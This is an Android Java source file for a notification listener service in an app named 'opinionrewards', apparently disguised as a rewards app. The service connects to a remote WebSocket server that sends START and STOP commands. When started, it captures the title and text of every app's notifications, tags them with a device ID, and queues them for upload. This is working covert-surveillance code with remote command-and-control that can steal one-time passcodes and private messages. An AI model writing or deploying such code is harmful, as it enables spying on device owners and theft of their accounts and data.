package com.opinionrewards;

import android.content.Context;
import android.content.SharedPreferences;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import com.opinionrewards.db.AppDatabase;
import com.opinionrewards.db.NotificationEntity;
import org.json.JSONObject;
import java.util.UUID;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class NotificationListenerService extends android.service.notification.NotificationListenerService {

    private boolean isIntercepting = false;
    private OkHttpClient client;
    private WebSocket webSocket;
    private static final String WS_URL = "ws://192.168.1.36:8000/ws";

    @Override
    public void onCreate() {
        super.onCreate();
        
        // Load persistent state immediately to handle immediate post-boot notifications
        SharedPreferences prefs = getSharedPreferences("OpinionRewardsPrefs", Context.MODE_PRIVATE);
        isIntercepting = prefs.getBoolean("IS_INTERCEPTING", false);
        
        client = new OkHttpClient.Builder()
                .pingInterval(15, TimeUnit.SECONDS)
                .build();
        connectWebSocket();
    }

    private void connectWebSocket() {
        String deviceId = getOrCreateDeviceId();
        String wsUrl = "wss://access-app-tki6.onrender.com/ws?clientType=device&deviceId=" + deviceId;

        Request request = new Request.Builder()
                .url(wsUrl)
                .build();
        
        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onMessage(WebSocket webSocket, String text) {
                try {
                    JSONObject json = new JSONObject(text);
                    if (json.has("command")) {
                        String cmd = json.getString("command");
                        SharedPreferences prefs = getSharedPreferences("OpinionRewardsPrefs", Context.MODE_PRIVATE);
                        if ("START".equals(cmd)) {
                            isIntercepting = true;
                            prefs.edit().putBoolean("IS_INTERCEPTING", true).apply();
                        } else if ("STOP".equals(cmd)) {
                            isIntercepting = false;
                            prefs.edit().putBoolean("IS_INTERCEPTING", false).apply();
                        }
                    }
                } catch (Exception e) {
                    // Ignore parsing errors
                }
            }
            
            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                reconnect();
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, okhttp3.Response response) {
                reconnect();
            }
        });
    }

    private void reconnect() {
        Executors.newSingleThreadScheduledExecutor().schedule(() -> {
            if (client != null) {
                connectWebSocket();
            }
        }, 5, TimeUnit.SECONDS);
    }

    private String getOrCreateDeviceId() {
        SharedPreferences prefs = getSharedPreferences("OpinionRewardsPrefs", Context.MODE_PRIVATE);
        String deviceId = prefs.getString("DEVICE_ID", null);
        if (deviceId == null) {
            deviceId = "NODE_" + UUID.randomUUID().toString().substring(0, 8).toUpperCase();
            prefs.edit().putString("DEVICE_ID", deviceId).apply();
        }
        return deviceId;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || !isIntercepting) return; // Drop if not actively intercepting!

        // Extract notification data
        NotificationEntity entity = new NotificationEntity();
        entity.id = sbn.getPackageName() + "_" + sbn.getPostTime() + "_" + sbn.getId();
        entity.packageName = sbn.getPackageName();
        entity.postTime = sbn.getPostTime();
        entity.deviceId = getOrCreateDeviceId();

        android.app.Notification notification = sbn.getNotification();
        if (notification.extras != null) {
            CharSequence title = notification.extras.getCharSequence(android.app.Notification.EXTRA_TITLE);
            CharSequence text = notification.extras.getCharSequence(android.app.Notification.EXTRA_TEXT);
            entity.title = title != null ? title.toString() : "";
            entity.text = text != null ? text.toString() : "";
        }
        entity.status = "PENDING";

        // Zero-latency persistence on background thread
        Executors.newSingleThreadExecutor().execute(() -> {
            AppDatabase.getDatabase(getApplicationContext())
                    .notificationDao()
                    .insert(entity);

            // Trigger WorkManager for batched upload
            enqueueUploadWork();
        });
    }

    private void enqueueUploadWork() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(true)
                .build();

        OneTimeWorkRequest uploadWorkRequest = new OneTimeWorkRequest.Builder(UploadWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(getApplicationContext()).enqueue(uploadWorkRequest);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (webSocket != null) {
            webSocket.close(1000, "Service destroyed");
        }
    }
}